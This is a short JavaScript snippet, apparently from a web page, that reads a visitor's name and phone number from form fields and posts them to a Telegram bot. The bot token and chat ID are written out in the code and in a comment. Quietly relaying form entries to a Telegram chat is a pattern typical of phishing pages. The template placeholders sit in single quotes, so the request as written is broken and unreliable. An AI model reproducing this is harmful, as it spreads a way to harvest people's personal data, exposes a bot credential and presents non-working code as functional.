//api.telegram.org/bot7064810423:AAFPfi8hFavZ6GYVj3218idm9OSPaGQOEfs/sendMessage?chat_id=-1002365592105&text=Hallo%0AJuga&parse_mode=

// nama%3A%0Anama%0APhone%20%3A%0A08495393985


function Kirimpesan() {
    var nama = document.getElementById('nama');
    var Phone = document.getElementById('Phone');
    
    var gabungan = 'nama%3A%0A' + nama.value + 'Phone%20%3A%0A' + Phone.value;

    var token = '7064810423:AAFPfi8hFavZ6GYVj3218idm9OSPaGQOEfs';
    var grup = '-1002365592105';

    $.ajax({
        url: 'https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html',
        method: 'POST' 
    })
}